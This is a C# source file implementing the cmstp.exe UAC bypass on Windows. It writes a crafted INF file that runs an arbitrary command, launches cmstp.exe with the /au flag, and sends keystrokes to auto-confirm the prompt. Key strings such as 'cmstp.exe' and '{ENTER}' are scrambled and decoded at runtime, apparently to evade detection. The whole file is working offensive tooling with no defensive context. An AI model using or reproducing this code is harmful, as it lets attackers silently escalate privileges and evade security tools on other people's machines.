using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Collections.Generic;
using System.Windows;
using System.Runtime.InteropServices;
 
public class CMSTPBypass
{
    public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
 
[RunPreSetupCommandsSection]
SERBERT_TOXCICLIC_ROBOFLAVIN
taskkill /IM GORKBOUY /F
 
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
 
[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\ChatClient.toml"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
 
[Strings]
ServiceName=""VPN""
ShortSvcName=""VPN""
 
";
 
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
 
    private static string BP = "c:\\windows\\system32\\";
    private static string bp = "pste.mcx"; //cmstp.exe
    private static string gp = "C3R2M.GEX"; // CMMGR32.EXE
    private static string waitsend = "{RETN}"; // {ENTER}
    private static List<int> wonk = new List<int> {6,5,1,2,0,4,3,7,3};
    private static List<int> ponk = new List<int> {0,4,4,6,2,1,3,5,7,8,7};
    private static List<int> gonk = new List<int> {0,2,4,3,2,1,5};

    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string TemporaryDir = "C:\\windows\\tasks";
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append("\\");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("SERBERT_TOXCICLIC_ROBOFLAVIN", CommandToExecute);
        newInfData.Replace("ChatClient.toml", WompWomp(gp,ponk));
        newInfData.Replace("GORKBOUY", WompWomp(bp,wonk));
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {
        if(!File.Exists(BP+WompWomp(bp,wonk)))
        {
            return false;
        }
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));
 
        ProcessStartInfo startInfo = new ProcessStartInfo(BP+WompWomp(bp,wonk));
        startInfo.Arguments = "/au " + InfFile.ToString();
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);
 
        IntPtr windowHandle = new IntPtr();
        windowHandle = IntPtr.Zero;
        do {
            windowHandle = SetWindowActive(WompWomp(bp,wonk));
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait(WompWomp(waitsend,gonk));
        return true;
    }
 
    public static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if(target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }

    private static string WompWomp(String G, List<int> L){
        string up = "";
        for (int i=0; i<L.Count; i++){
            up = up + G.Substring(L[i],1);
        }
        return up;
    }

}
